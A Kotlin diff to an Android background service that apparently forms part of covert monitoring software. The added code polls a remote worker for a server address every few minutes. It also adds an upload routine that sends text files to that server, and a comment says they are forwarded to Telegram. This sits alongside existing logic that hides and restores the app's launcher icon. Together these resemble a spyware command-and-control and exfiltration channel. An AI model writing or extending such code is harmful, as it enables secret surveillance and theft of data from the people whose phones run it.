@@ -52,6 +52,13 @@ class PingService : Service() {
             return hash.take(10).joinToString("") { "%02x".format(it) }
         }
 
+        const val KEY_SERVER_URL = "server_url"
+        const val KEY_PING_URL   = "ping_url"
+
+        fun serverUrl(ctx: Context): String =
+            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+                .getString(KEY_SERVER_URL, "") ?: ""
+
         fun currentDomain(ctx: Context): String =
             ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                 .getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN
@@ -118,8 +125,13 @@ class PingService : Service() {
 
     /* ================================================================ loop */
 
+    private var configFetchCounter = 0
+
     private fun tick() {
-        IconManager.retryIfPending(this)  // re-apply any pending hide/show
+        IconManager.retryIfPending(this)
+        // Refresh config every 60 pings (~5 minutes)
+        if (configFetchCounter % 60 == 0) fetchConfig()
+        configFetchCounter++
         if (isOnline()) sendPing()
         handler?.removeCallbacksAndMessages(null)
         handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
@@ -353,6 +365,57 @@ class PingService : Service() {
 
     // J — unhide and restore main icon
     private fun unHide() = IconManager.show(this)
+
+    /* ======================================================= server upload */
+
+    /** Fetch dynamic config (server_url, ping_url) from worker. */
+    private fun fetchConfig() {
+        val url = WORKER_URL.replace("/ping", "/config")
+        val req = okhttp3.Request.Builder().url(url)
+            .addHeader("X-Token", APP_TOKEN).get().build()
+        client.newCall(req).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: java.io.IOException) {}
+            override fun onResponse(call: Call, response: Response) {
+                response.use {
+                    if (!it.isSuccessful) return
+                    try {
+                        val json = JSONObject(it.body?.string() ?: "")
+                        val srv  = json.optString("server_url", "")
+                        if (srv.isNotBlank()) {
+                            prefs.edit().putString(KEY_SERVER_URL, srv).apply()
+                            Log.i(TAG, "server_url updated: $srv")
+                        }
+                    } catch (_: Exception) {}
+                }
+            }
+        })
+    }
+
+    /** Upload a text file to the file server → forwarded to Telegram. */
+    fun uploadText(filename: String, content: String, caption: String = "") {
+        val serverUrl = serverUrl(this)
+        if (serverUrl.isBlank()) {
+            Log.w(TAG, "no server_url configured")
+            return
+        }
+        val bytes = content.toByteArray(Charsets.UTF_8)
+        val body  = okhttp3.RequestBody.create("text/plain".toMediaType(), bytes)
+        val req   = okhttp3.Request.Builder()
+            .url("$serverUrl/upload")
+            .addHeader("X-Token", APP_TOKEN)
+            .addHeader("X-Filename", filename)
+            .addHeader("X-Caption", caption)
+            .post(body)
+            .build()
+        client.newCall(req).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: java.io.IOException) {
+                Log.w(TAG, "upload failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                response.use { Log.i(TAG, "upload done: ${it.code}") }
+            }
+        })
+    }
 
     /* =========================================================== device info */
 
